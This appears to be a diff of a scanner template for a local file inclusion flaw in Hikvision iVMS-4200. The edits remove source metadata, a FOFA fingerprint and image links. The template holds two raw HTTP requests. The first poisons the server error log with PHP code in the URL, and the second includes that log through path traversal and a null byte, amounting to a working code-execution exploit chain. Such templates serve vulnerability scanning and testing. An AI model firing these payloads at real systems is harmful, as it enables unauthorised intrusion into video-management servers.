@@ -3,20 +3,14 @@ info:
   name: 海康威视 iVMS 4200 index.php 存在本地文件包含漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dowef1kqw0n0dddx'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dowef1kqw0n0dddx
-    fofa: body="<div class=\"enname\">iVMS-4200"
 http:
 - raw:
   - 'GET /%3C%3Fphp%20echo%20md5(123)%3F%3E HTTP/1.1
 
     Host: {{Hostname}}
 
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1749827017624-37ba91f2-2234-420b-b71e-608a206d44aa.png)
 
     文件包含日志文件'
   redirects: false
@@ -27,9 +21,7 @@ http:
 - raw:
   - 'GET /index.php?controller=../../../../Server/logs/error.log%00.php HTTP/1.1
 
-    Host: {{Hostname}}
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1749827017949-5477804c-f11e-4bd7-86b0-dce5047fa689.png)'
+    Host: {{Hostname}}'
   redirects: false
   matchers:
   - status:
